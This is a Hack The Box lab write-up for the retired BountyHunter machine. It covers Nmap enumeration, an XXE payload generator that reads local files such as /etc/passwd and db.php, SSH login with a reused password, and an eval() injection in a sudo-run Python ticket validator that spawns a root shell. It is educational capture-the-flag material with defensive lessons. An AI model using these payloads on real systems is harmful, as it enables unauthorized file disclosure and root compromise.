---
title: "Hack The Box — BountyHunter"
summary: "BountyHunter's Base64-encoded XML API permits XXE file reads. A leaked PHP credential opens SSH, and unsafe Python eval in a sudo script yields root."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Linux"
solvedAt: 2026-11-24
publishedAt: 2026-11-24
tags:
  - xxe
  - xml-external-entity
  - source-disclosure
  - credential-reuse
  - python-eval
  - sudo
  - privilege-escalation
tools:
  - Nmap
  - Burp Suite
  - Python
  - SSH
cves: []
htbUrl: "https://app.hackthebox.com/machines/BountyHunter"
cover: "/images/writeups/hackthebox/machines/bountyhunter/bountyhunter.png"
coverAlt: "Hack The Box BountyHunter machine artwork with a green bounty hunter holding a Wanted poster"
featured: false
draft: false
---

> This write-up documents an authorized Hack The Box lab. An [official HTB achievement page for BountyHunter](https://labs.hackthebox.com/achievement/machine/332061/359) labels the Machine **RETIRED**, meeting [HTB's write-up publication rule](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines). Flag values, passwords, personal secrets and session-specific IP addresses are omitted. The steps show how to recover the lab credential yourself.

## Executive summary

BountyHunter exposes a bounty report form that sends Base64-encoded XML to a PHP endpoint. The server resolves attacker-supplied external XML entities, so a crafted report can read local files. Reading `/var/www/html/db.php` reveals a database password that also works for the Linux account `development`. That account can run a Skytrain ticket validator through `sudo` as root. The validator checks only a numeric prefix, then passes the entire ticket expression to Python's `eval()`. A ticket that passes the prefix check can therefore execute a root shell.

## Target information

| Item | Value |
| --- | --- |
| Target | BountyHunter |
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Linux |
| Publication policy | [Retired, as shown by Hack The Box](https://labs.hackthebox.com/achievement/machine/332061/359) |
| Solved | 24 November 2026 |
| Main weaknesses | XXE file read, credential reuse, unsafe `eval()` under `sudo` |

Hack The Box assigns an address to each spawned instance. Replace `<TARGET_IP>` with your own target address throughout this guide.

## Enumeration

I scanned all TCP ports with service and default-script detection:

```bash
nmap <TARGET_IP> -T5 -sVC -p-
```

The actionable results were:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Nmap warned that the target hit the retransmission cap at `-T5`. SSH needed credentials, so HTTP was the starting point. If your scan misses responses, repeat it at a less aggressive timing level before concluding that a port is closed.

The site at `http://<TARGET_IP>/` has a **Portal** link. Its bounty report page, `/log_submit.php`, displays four fields: exploit title, CWE, CVSS score and reward. At first, clicking Submit did not reveal a normal HTML form submission in Burp. The page source explains why: there is no `<form>` element. Instead, the button calls `bountySubmit()` from `/resources/bountylog.js`.

The relevant JavaScript is:

```javascript
function returnSecret(data) {
  return Promise.resolve($.ajax({
    type: "POST",
    data: {"data": data},
    url: "tracker_diRbPr00f314.php"
  }));
}

async function bountySubmit() {
  var xml = `<?xml version="1.0" encoding="ISO-8859-1"?>
  <bugreport>
    <title>${$('#exploitTitle').val()}</title>
    <cwe>${$('#cwe').val()}</cwe>
    <cvss>${$('#cvss').val()}</cvss>
    <reward>${$('#reward').val()}</reward>
  </bugreport>`;
  let data = await returnSecret(btoa(xml));
  $("#return").html(data);
}
```

This reveals the actual request path: an Ajax `POST` to `/tracker_diRbPr00f314.php` with a URL-encoded `data` parameter containing Base64-encoded XML. Base64 changes the transport format; it does not make the XML safe to parse.

### Findings

| Evidence | Why it mattered |
| --- | --- |
| `/log_submit.php` loads `/resources/bountylog.js` | The form's behavior is in client-side code. |
| The script sends XML as Base64 in `data` | The XML can be replaced after decoding or generated directly. |
| The server echoes the parsed title in its response | A file-read result can appear in the Title field. |
| SSH is open | A disclosed password may provide an interactive foothold. |

## Initial access

### Confirm how the report is processed

Fill the fields with simple ASCII test values, submit the report, and send the resulting `POST` to **Burp Repeater**. A normal response contains the submitted values:

```text
If DB were ready, would have added:
Title: kkk
CWE: kkk
Score: kkk
Reward: kkk
```

The actual response is an HTML table; the abbreviated output above shows the values that matter. If no `POST` appears, inspect the browser Console and verify that the JavaScript files load. You can also construct the request directly in Repeater from the endpoint and parameter shown above.

### Confirm XXE with a harmless file

The following reusable helper produces the complete URL-encoded `data=` body. Create it on Kali:

```bash
cat > xxe.py <<'PY'
import base64
import sys
from urllib.parse import urlencode

uri = sys.argv[1]
xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE bugreport [<!ENTITY xxe SYSTEM "{uri}">]>
<bugreport><title>&xxe;</title><cwe>1</cwe><cvss>1</cvss><reward>1</reward></bugreport>'''

print(urlencode({"data": base64.b64encode(xml.encode()).decode()}))
PY

python3 xxe.py file:///etc/hostname
```

Copy the output into the body of the Repeater request, replacing the previous `data=...` line. Keep the existing `POST /tracker_diRbPr00f314.php`, `Host` and `Content-Type: application/x-www-form-urlencoded` lines. Burp recalculates `Content-Length`. Send the request. The response's **Title** field now contains the target hostname, `bountyhunter`, instead of the literal `&xxe;`. This confirms that the server expanded the external entity and read a local file.

The request has two encoding layers: the form body is URL-encoded, and its `data` value is Base64-encoded XML. The `DOCTYPE` and `&xxe;` must exist **inside the decoded XML**, not as plain text beside `data=`.

### Read the PHP configuration

The same file-read primitive can inspect other local paths. To identify interactive Linux accounts, try `file:///etc/passwd` and look for a user with a shell, such as `development`. For PHP source, use a conversion filter so markup in the PHP file does not break the XML response:

```bash
python3 xxe.py 'php://filter/convert.base64-encode/resource=/var/www/html/db.php'
```

Replace the Repeater body with the new output and send it. The **Title** field contains another Base64 string: this one represents the contents of `db.php`, not the original request. Copy only that Title value and decode it locally:

```bash
printf '%s' '<BASE64_FROM_TITLE>' | base64 -d
```

The relevant configuration structure is:

```php
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "<recover this value from your decoded db.php>";
```

The `admin` value is a **database** username. It is not the SSH account. Copy the actual `$dbpassword` value from your decoded file; it is reused for the Linux user `development`:

```bash
ssh development@<TARGET_IP>
# At the password prompt, enter the db.php password you recovered.
id
```

The successful session reports `uid=1000(development)`. The user flag is in that account's home directory; its value is intentionally omitted here.

## Privilege escalation

### Inspect the permitted root command

John's `~/contract.txt` points the team toward Skytrain Inc's ticket validator. Check the account's sudo rights and read the named script:

```bash
cat ~/contract.txt
sudo -l
sed -n '1,240p' /opt/skytrain_inc/ticketValidator.py
```

The critical sudo rule is:

```text
(root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

The validator accepts a `.md` ticket path. It requires the first line to start with `# Skytrain Inc`, the second with `## Ticket to `, and a `__Ticket Code:__` marker followed by a line beginning with `**`. Its decisive code is:

```python
ticketCode = x.replace("**", "").split("+")[0]
if int(ticketCode) % 7 == 4:
    validationNumber = eval(x.replace("**", ""))
    if validationNumber > 100:
        return True
```

Only the value **before the first `+`** is tested as an integer. The entire line, with `**` removed, is then evaluated as a Python expression. The integer `11` satisfies `11 % 7 == 4`; anything after its first `+` reaches `eval()`. Since the interpreter is launched through the allowed `sudo` rule, that expression runs as root.

### Supply a ticket that opens a root shell

Create a Markdown file that satisfies the validator's structural checks:

```bash
cat > /tmp/skytrain.md <<'EOF'
# Skytrain Inc
## Ticket to Root
__Ticket Code:__
**11+__import__('os').system('/bin/bash')+1000**
EOF

sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

When prompted, enter `/tmp/skytrain.md`. The prefix is `11`, so the modulo check passes. `eval()` then runs `os.system('/bin/bash')`, opening an interactive root shell. The `+1000` makes the expression's result exceed 100 after that shell exits, allowing the ticket to finish validation. Verify the shell before reading the root flag:

```bash
id
# uid=0(root) ...
```

The observed root prompt and access to `/root/root.txt` confirmed completion. The flag value is not published.

## What did not work

- Looking for a native form submission did not reveal the endpoint. The page uses a JavaScript `onclick` handler and Ajax; reading `/resources/bountylog.js` exposed the real `POST`.
- An early PHP-file payload accidentally nested one `<!ENTITY xxe SYSTEM ...>` declaration inside another. The server returned empty fields because the XML was malformed. Keeping exactly one entity declaration produced the Base64 file content.

## Attack path

1. Enumerate TCP/22 and TCP/80; inspect the bounty portal.
2. Read the JavaScript and identify the Base64-encoded XML `POST` endpoint.
3. Inject an external entity and prove local file access with `/etc/hostname`.
4. Read and decode `db.php`; reuse its lab password to SSH as `development`.
5. Inspect `sudo -l` and the Skytrain validator's source.
6. Pass a ticket whose numeric prefix satisfies the check while the rest of the expression invokes a root shell through `eval()`.

## Lessons learned

- An encoded request body still needs the same parser scrutiny as readable XML. The vulnerability is entity expansion on untrusted XML, not Base64 itself.
- Following the browser's JavaScript is often faster than guessing what a visible form submits.
- Validate the exact value you intend to use. A prefix check does not constrain a later evaluation of the whole string.
- Prevent this chain by disabling external entity resolution for untrusted XML, avoiding password reuse across services, and replacing `eval()` with a strict numeric parser before granting a script privileged execution.

## References

- [Hack The Box BountyHunter retirement evidence](https://labs.hackthebox.com/achievement/machine/332061/359)
- [Hack The Box publication guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
- [OWASP XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PHP conversion filters](https://www.php.net/manual/en/filters.convert.php)
- [Python `eval()` documentation](https://docs.python.org/3.8/library/functions.html#eval)
